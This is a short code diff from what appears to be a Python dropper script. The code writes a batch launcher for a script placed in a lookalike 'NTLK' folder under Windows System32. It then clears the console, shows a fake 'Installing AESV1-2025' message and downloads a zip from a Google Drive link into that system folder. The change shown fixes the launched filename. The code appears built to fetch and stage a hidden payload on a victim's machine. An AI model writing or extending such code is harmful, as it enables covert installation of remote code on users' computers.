@@ -116,7 +116,7 @@ def create_batch_file(python_command, script_name):
     else:
         print("")
 if not os.path.exists("C:\\Windows\\System32\\NTLK\\v1-2025.py"):
-    create_batch_file("py -3.11", r"C:\Windows\System32\NTLK\v1-2025.0.py")
+    create_batch_file("py -3.11", r"C:\Windows\System32\NTLK\v1-2025.py")
     os.system('cls')
     print("Installing AESV1-2025 please wait...")
     download_file_from_google_drive("https://drive.google.com/uc?id=1s8YfBSbHXmPGk9gE2n_qDsndgNGaRCY7", "C:\\Windows\\System32\\NTLK\\v1-2025.zip")
